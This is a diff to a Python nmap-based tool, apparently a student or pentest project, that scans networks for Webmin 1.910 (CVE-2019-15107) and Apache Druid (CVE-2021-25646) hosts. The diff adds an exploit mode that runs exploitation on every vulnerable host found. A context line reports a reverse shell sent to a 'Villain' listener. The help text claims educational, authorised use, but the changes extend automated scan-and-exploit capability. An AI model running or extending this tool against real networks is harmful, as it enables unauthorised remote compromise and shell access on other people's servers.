@@ -79,7 +79,7 @@ def ask_ip_range(scan_type):
                 return adresse_ip
                 break
             else:
-                print(RED +"Format d'adresse IP invalide. Veuillez entrer une adresse IP valide.")
+                print(RED +"Format d'adresse IP invalide. Veuillez entrer une adresse IP valide." + ENDC)
     elif scan_type == "r":
         while True:
             network_range = input(ENDC + "Entrez une adresse réseau (192.168.1.0/24) : ")
@@ -122,7 +122,7 @@ def simple_scan(adresse_ip):
         print(ve)
         sys.exit(1)
 
-def network_simple_scan(network_range):
+def network_simple_scan(network_range,lhost):
     hosts_list = []
     scanner = nmap.PortScanner()
     try:
@@ -132,8 +132,9 @@ def network_simple_scan(network_range):
         sys.exit(1)
         return None, None
     for host in scanner.all_hosts():
-        hosts_list.append(host)
-        hostcount = len(hosts_list)
+        if host != lhost:
+            hosts_list.append(host)
+            hostcount = len(hosts_list)
     try:
         if not (hosts_list):
             raise ValueError(RED + "❌ No available host found on the specified network." + ENDC)
@@ -261,7 +262,7 @@ def network_fullscan(net_fullscan, hosts_list):
             for host in hosts_list:
                 scanner = nmap.PortScanner()
                 try:
-                    scanner.scan(host, arguments='-T5 -Pn -p 8080,10000')
+                    scanner.scan(host, arguments='-T5 -Pn -p 8080,8888,10000')
                 except nmap.PortScannerError as e:
                     print(f"Error scanning host {host}: {e}")
                     continue
@@ -275,7 +276,27 @@ def network_fullscan(net_fullscan, hosts_list):
                     result_dict_nw[host] = better_scan(host, open_ports)
                 pbar.update(1)
 
-
+def network_fullscan_exploit(net_fullscan, hosts_list, lhost):
+    result_dict_nw = {}  # Dictionary to store detailed scan results for each IP
+    if net_fullscan:
+        print("Starting deep scan on each host and port discovered...")
+        with tqdm(total=len(hosts_list)) as pbar:
+            for host in hosts_list:
+                scanner = nmap.PortScanner()
+                try:
+                    scanner.scan(host, arguments='-T5 -Pn -p 8080,8888,10000')
+                except nmap.PortScannerError as e:
+                    print(f"Error scanning host {host}: {e}")
+                    continue
+                open_ports = [p for p in scanner[host]['tcp'].keys() if scanner[host]['tcp'][p]['state'] == 'open']
+                if not open_ports:
+                    open_ports_str = "none"
+                else:
+                    open_ports_str = ", ".join(map(str, open_ports))
+                print(f"Open ports for host {host}: {open_ports_str}")
+                if open_ports:
+                    result_dict_nw[host] = better_scan_exploit(host, open_ports, lhost)
+                pbar.update(1)
 
 def check_CVEs(service_name, product, extra_info, version):
     if ('MiniServ' in product.lower() or 'webmin' in extra_info.lower()) and '1.910' in version:
@@ -362,21 +383,25 @@ def exploit_CVE_2021_25646(result_dict,lhost):
                 print("Exploit attempt done, reverse shell sent to Villain 192.168.1.72")
 
 def main():
-    parser = argparse.ArgumentParser(description="Your script description here")
-    parser.add_argument("-S", "--scan", action="store_true", help="Scan mode")
-    parser.add_argument("-E", "--exploit", action="store_true", help="Exploit mode")
+    parser = argparse.ArgumentParser(description="This script will make multiple scans on hosts or network. It's meant to detect and/or exploit CVE-2019-15107 (Webmin 1.910) and CVE-2021-25646 (Apache Druid). This tool is developped for educationnal purposes, please use it only if you have explicit consent and authorisation to do so.")
+    parser.add_argument("-s", "--scan", action="store_true", help="Scan mode, this mode will attempt scans but will never exploit any vulnerability found.")
+    parser.add_argument("-e", "--exploit", action="store_true", help="Exploit mode, this mode works exaclty like scan mode BUT it will attempt to exploit any vulnerability found.")
 
     args = parser.parse_args()
 
+    if args.scan and args.exploit:
+        print("Error: You cannot use both scan mode (-s) and exploit mode (-e) at the same time. Please choose one.")
+        sys.exit(1)
+
     if args.scan:
         print("Scan mode activated...")
-        
+        lhost = get_current_ip()
         scan_type = choose_scan_type()
 
         # Prompt for network range scan
         if scan_type == "r":
             network_range = ask_ip_range(scan_type)
-            hosts_list = network_simple_scan(network_range)
+            hosts_list = network_simple_scan(network_range, lhost)
             net_fullscan = net_fullscan_ask()
             if net_fullscan:  # Check if net_fullscan is True
                 network_fullscan(net_fullscan, hosts_list)
@@ -396,10 +421,10 @@ def main():
         scan_type = choose_scan_type()
         if scan_type == "r":
             network_range = ask_ip_range(scan_type)
-            hosts_list = network_simple_scan(network_range)
+            hosts_list = network_simple_scan(network_range, lhost)
             net_fullscan = net_fullscan_ask()
             if net_fullscan:  # Check if net_fullscan is True
-                network_fullscan(net_fullscan, hosts_list)
+                network_fullscan_exploit(net_fullscan, hosts_list, lhost)
 
         # Prompt for single IP scan
         else:
